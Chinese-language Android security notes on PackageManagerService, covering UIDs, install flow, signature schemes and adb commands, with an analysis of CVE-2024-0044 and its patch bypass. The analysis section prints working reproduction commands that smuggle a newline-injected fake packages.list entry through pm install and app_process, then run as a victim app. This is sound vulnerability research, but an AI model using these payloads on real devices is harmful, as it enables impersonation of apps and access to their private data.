# 3x02 - PackageManagerService (PMS)

PMS 负责管理系统中所有的安装包（APK）及其权限。

它解决的核心问题是：

- “这个包是谁？”（包名、uid、签名、版本、组件清单）
- “这个包能做什么？”（权限、AppOps、privileged 白名单、签名权限）
- “系统如何在多用户下维护这些映射？”（userId/appId、profile 安装状态）

## 1. 核心职责
- **解析 APK**: 读取 `AndroidManifest.xml`。
- **权限管理**: 维护 UID 与权限的映射关系。
- **签名验证**: 确保应用升级时的签名一致性。

补充：现代 Android 的权限体系已经拆分出 `PermissionManagerService` 等组件，但“包信息与签名真实性”仍然是 PMS 的底座。

## 2. 安全研究重点
- **签名绕过**: 历史上的 V1/V2 签名漏洞。
- **权限提升**: 通过修改 `packages.xml` 或利用 PMS 逻辑漏洞获取特权。
- **安装包劫持**: 在安装过程中替换 APK 文件。

## 3. PMS 视角的数据模型

### 3.1 包、UID 与用户

几个容易混淆的概念：

- `packageName`：逻辑身份
- `appId`：系统分配给应用的基础 id（跨用户共享）
- `uid = userId * 100000 + appId`：最终在 Linux 层体现的 UID（规则会随版本调整，但“按用户空间偏移”不变）

很多越权问题本质是：把 `uid/appId/userId` 混用导致跨用户访问。

### 3.2 组件与导出

PMS 会解析并记录四大组件及其导出信息：

- `Activity`
- `Service`
- `Receiver`
- `Provider`

Android 12 起，若组件声明 `intent-filter` 但未显式声明 `android:exported` 会直接安装失败，这属于“从构建期/安装期强制纠错”。

## 4. 代表性CVE案例

### 4.3 [CVE-2021-0478](../../../cves/entries/CVE-2021-0478.md) (PackageInstaller提权)

**位置**：PackageInstaller权限检查

**根因**：安装会话创建时的调用者UID检查不足

**影响**：无权限应用可安装任意包

## 5. 安装/更新的主链路（概念层）

不同版本实现差别较大，但可以用下面的框架理解：

1. **输入来源**：PackageInstaller / `pm install` / 系统 OTA
2. **解析与校验**：manifest、SDK 版本、ABI、`uses-feature`、签名
3. **准备安装会话**：写入临时目录、校验摘要
4. **提交与原子切换**：移动到最终路径，更新 settings
5. **广播与优化**：发安装广播、触发 dexopt/编译等

审计安全时重点盯：

- “校验对象”是否与“最终安装对象”一致（是否存在替换窗口）
- 任何可以影响安装目标路径/包名/签名决策的参数

## 6. 签名验证要点（研究必备）

### 6.1 V1/V2/V3 的关键差异

- **V1 (JAR)**：对条目做签名，历史上出现过利用 ZIP 结构歧义的绕过
- **V2/V3**：对整个 APK 做更强的一致性保护（但实现/解析错误仍可能出现）

### 6.2 在源码里通常会遇到的对象

- “包的签名细节”对象（例如 `SigningDetails` 类似概念）
- “签名比对/继承/轮换”逻辑（key rotation）

审计时关注：

- 升级路径是否允许“更弱”的签名集合
- 是否存在 debug/测试开关影响签名强度

## 7. 权限授予与特权白名单

### 7.1 运行时权限与默认授权

现代系统中，权限授予分层较多（PMS + PermissionManager + AppOps），但 PMS 仍然是“声明源”。

### 7.2 privileged app 与 `privapp-permissions`

特权应用（`/system/priv-app`）常通过白名单文件被授予敏感权限。

研究/排查时要注意：

- 白名单文件与包名是否匹配
- 设备厂商定制是否额外扩权

## 8. 现场排查命令

- 查看包列表：`adb shell pm list packages`
- 查看某包详细信息：`adb shell dumpsys package <package>`
- 查看权限：`adb shell dumpsys package <package> | grep -i permission -n`
- 查看安装路径与 ABI：`adb shell pm path <package>`

与数据文件相关的常见位置（Root/工程机更常用）：

- `/data/system/packages.xml`（包与 uid/flag 的持久化记录之一）
- `/data/system/users/<id>/package-restrictions.xml`（用户维度安装状态/禁用状态等）

## 9. Canyie (残页) 相关 CVE

> GitHub: https://github.com/canyie | Blog: https://blog.canyie.top

### 9.1 [CVE-2024-0044](../../../cves/entries/CVE-2024-0044.md) 深度分析 (packages.list 注入 → run-as 任意应用提权)

这是一个非常经典的案例：原始漏洞由 Meta Red Team X 的 Tom Hebb 发现，Canyie 在原始补丁发布 2 个月后发现了绕过方式。

#### 背景：`packages.list` 与 `run-as`

Android 使用 `/data/system/packages.list` 存储已安装应用的基本信息，每行一个应用：

```text
com.example.app 10123 0 /data/user/0/com.example.app default:targetSdkVersion=28 none 0 0 1 @null
```

`run-as` 是 Android 提供的调试工具，允许 adb shell 以指定应用的身份执行命令。它通过读取 `packages.list` 来验证目标应用是否可调试（`debuggable=true`）。

#### 原始漏洞

**根因**：`PackageInstallerService.createSessionInternal()` 未校验 `installerPackageName` 参数中的换行符

**攻击链**：
```text
1. 攻击者通过 adb 调用 pm install，传入包含 \n 的 installerPackageName
2. PMS 将恶意字符串写入 packages.list
3. 换行符导致注入伪造的应用条目（debuggable=true）
4. run-as 读取到伪造条目，允许以任意应用身份执行
```

**利用示例**：
```bash
# 注入 payload 伪装成 victim 应用
PAYLOAD="@null
victim <victim_uid> 1 /data/user/0 default:targetSdkVersion=28 none 0 0 1 @null"
pm install -i "$PAYLOAD" /path/to/poc.apk
# 现在可以以 victim 身份执行命令
run-as victim
```

#### 原始补丁的问题

Google 在 2024-03 ASB 中添加了校验：

```java
// 补丁代码 (PackageInstallerService.java)
if (params.installerPackageName != null && !isValidPackageName(
        params.installerPackageName)) {
    params.installerPackageName = null;
}

String requestedInstallerPackageName =
        params.installerPackageName != null ? params.installerPackageName
                : installerPackageName;  // ← 问题在这里
```

补丁只校验了 `params.installerPackageName`，但忽略了 `installerPackageName` 参数本身。当 `params.installerPackageName` 为 null 或无效时，`requestedInstallerPackageName` 会回退到未经校验的 `installerPackageName`。

#### Canyie 的绕过

关键观察：`createSession()` 方法有两个来源的 `installerPackageName`：

```java
public int createSession(SessionParams params, String installerPackageName, ...) {
    return createSessionInternal(params, installerPackageName, ...);
}
```

- `params.installerPackageName`：来自 SessionParams，**已被补丁校验**
- `installerPackageName`：独立参数，**未被校验**

通过 `pm` 命令直接调用底层接口，可以绕过 Java 层封装，直接传入恶意的 `installerPackageName`。

#### 复现（需要 adb 权限）

```bash
APK=/data/local/tmp/poc.apk
PAYLOAD="@null
victim <victim_uid> 1 /data/user/0 default:targetSdkVersion=28 none 0 0 1 @null"
app_process -Djava.class.path=$APK /system/bin top.canyie.cve_2024_0044.PoC "$APK" "$PAYLOAD"
run-as victim
```

#### 为什么漏洞能"复活"半年？

1. **CTS 测试覆盖不足**：Google 添加的测试用例使用标准 `PackageInstaller` API，该 API 会自动填充合法的 `installerPackageName`，无法覆盖 pm 命令的调用路径
2. **研究者的"惯性"**：已有人在打补丁的设备上成功复现，但未意识到补丁被绕过

> Canyie 在博客中引用歌词："再多看一眼就会爆炸"——如果任何人多花几秒仔细看补丁代码，这个赏金就是他们的。

#### 安全研究启示

- **审计补丁本身**：补丁代码同样可能有漏洞
- **测试多条调用路径**：API 封装层和底层接口可能有不同的校验逻辑
- **运行原始 PoC 验证补丁**：不要只依赖官方测试用例

**参考链接**：
- [PoC & Writeup](https://github.com/canyie/CVE-2024-0044)
- [Blog 分析](https://blog.canyie.top/2024/10/08/CVE-2024-0044/)
- [原始漏洞分析 (Meta)](https://rtx.meta.security/exploitation/2024/03/04/Android-run-as-forgery.html)
- [ASB 2024-03 (原始补丁)](https://source.android.com/docs/security/bulletin/2024-03-01)
- [ASB 2024-10 (绕过修复)](https://source.android.com/docs/security/bulletin/2024-10-01)

## 参考（AOSP）

- 应用签名（v1/v2/v3/v4、shared UID 废弃口径）：https://source.android.com/docs/security/features/apksigning
- 应用沙盒（签名与 UID/沙盒边界的关系背景）：https://source.android.com/docs/security/app-sandbox
- 架构概览（系统服务与框架层级）：https://source.android.com/docs/core/architecture
